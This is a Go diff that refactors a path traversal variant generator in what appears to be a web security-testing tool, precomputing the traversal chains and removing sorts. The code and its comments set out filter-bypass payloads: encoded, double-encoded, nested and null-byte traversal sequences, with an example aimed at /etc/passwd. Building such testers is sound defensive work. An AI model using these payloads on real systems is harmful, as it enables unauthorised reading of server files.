@@ -1,7 +1,6 @@
 package mutate
 
 import (
-	"sort"
 	"strings"
 
 	"github.com/bugsyhewitt/possession/internal/model"
@@ -159,6 +158,16 @@ var traversalTargets = []string{
 // and across builds.
 const traversalDepth = 6
 
+// Pre-computed traversal chains — these depend only on the constant
+// traversalDepth, so computing them once at package init avoids
+// repeated strings.Repeat calls inside the technique×target loop.
+var (
+	traversalChainSlash     = strings.Repeat("../", traversalDepth)
+	traversalChainEncoded   = strings.Repeat("..%2f", traversalDepth)
+	traversalChainDoubleEnc = strings.Repeat("..%252f", traversalDepth)
+	traversalChainNested    = strings.Repeat("....//", traversalDepth)
+)
+
 func (pt PathTraversal) Generate(base *model.CapturedRequest, _ *model.RoleMatrix) []model.Variant {
 	if !pt.Enabled || base == nil || base.URL == nil {
 		return nil
@@ -184,14 +193,12 @@ func (pt PathTraversal) Generate(base *model.CapturedRequest, _ *model.RoleMatri
 		base_ = "/"
 	}
 
-	// Deterministic copies sorted alphabetically. The order test pins
-	// both invariants.
-	targets := append([]string(nil), traversalTargets...)
-	sort.Strings(targets)
-
-	// Technique names, sorted so the outer-loop cross-product emission
-	// order is stable regardless of insertion order below. Pinned by
-	// the order test.
+	// Both slices are declared in sorted order at package level so no
+	// copy or re-sort is needed; iterating them directly keeps generation
+	// deterministic without per-call allocation.
+	//
+	// Technique names, already alphabetically ordered — pinned by the
+	// order test.
 	techniques := []string{
 		"absolute-path",
 		"dot-dot-double-encoded",
@@ -200,11 +207,10 @@ func (pt PathTraversal) Generate(base *model.CapturedRequest, _ *model.RoleMatri
 		"nested-dot-dot",
 		"null-byte-suffix",
 	}
-	sort.Strings(techniques)
 
 	var out []model.Variant
 	for _, tech := range techniques {
-		for _, tgt := range targets {
+		for _, tgt := range traversalTargets {
 			decoded, escaped, ok := buildTraversalPath(tech, base_, tgt)
 			if !ok {
 				continue
@@ -271,7 +277,7 @@ func buildTraversalPath(technique, baseDir, target string) (decoded, escaped str
 	case "dot-dot-slash":
 		// /api/files/ -> /api/files/../../../../../../etc/passwd
 		// Literal `../` chain; the most direct payload.
-		p := baseDir + strings.Repeat("../", traversalDepth) + target
+		p := baseDir + traversalChainSlash + target
 		return p, p, true
 
 	case "dot-dot-encoded":
@@ -279,8 +285,8 @@ func buildTraversalPath(technique, baseDir, target string) (decoded, escaped str
 		// Decoded form keeps the real "/" (the file lookup sees the
 		// traversal); the escaped form carries the literal %2f so the
 		// gateway's literal-`../` filter does not see the match.
-		decodedPath := baseDir + strings.Repeat("../", traversalDepth) + target
-		escapedPath := baseDir + strings.Repeat("..%2f", traversalDepth) + target
+		decodedPath := baseDir + traversalChainSlash + target
+		escapedPath := baseDir + traversalChainEncoded + target
 		return decodedPath, escapedPath, true
 
 	case "dot-dot-double-encoded":
@@ -292,8 +298,8 @@ func buildTraversalPath(technique, baseDir, target string) (decoded, escaped str
 		// comparative ladder (the `%25` is the encoding of `%`, which
 		// after one decode becomes `%2f`; url.URL.Path holds the
 		// single-decoded view).
-		decodedPath := baseDir + strings.Repeat("..%2f", traversalDepth) + target
-		escapedPath := baseDir + strings.Repeat("..%252f", traversalDepth) + target
+		decodedPath := baseDir + traversalChainEncoded + target
+		escapedPath := baseDir + traversalChainDoubleEnc + target
 		return decodedPath, escapedPath, true
 
 	case "nested-dot-dot":
@@ -301,7 +307,7 @@ func buildTraversalPath(technique, baseDir, target string) (decoded, escaped str
 		// Each `....//` collapses to `../` after a single-pass filter
 		// strips a `../` literal; the same payload defeats hand-written
 		// `replace("../", "")` sanitisers.
-		p := baseDir + strings.Repeat("....//", traversalDepth) + target
+		p := baseDir + traversalChainNested + target
 		return p, p, true
 
 	case "null-byte-suffix":
@@ -309,8 +315,8 @@ func buildTraversalPath(technique, baseDir, target string) (decoded, escaped str
 		// Bypasses extension-allowlist filters in C-backed handlers:
 		// the high-level string comparison sees a (post-NUL) suffix and
 		// approves; read(2)/open(2) terminate the path at NUL.
-		decodedPath := baseDir + strings.Repeat("../", traversalDepth) + target + "\x00"
-		escapedPath := baseDir + strings.Repeat("../", traversalDepth) + target + "%00"
+		decodedPath := baseDir + traversalChainSlash + target + "\x00"
+		escapedPath := baseDir + traversalChainSlash + target + "%00"
 		return decodedPath, escapedPath, true
 
 	case "absolute-path":
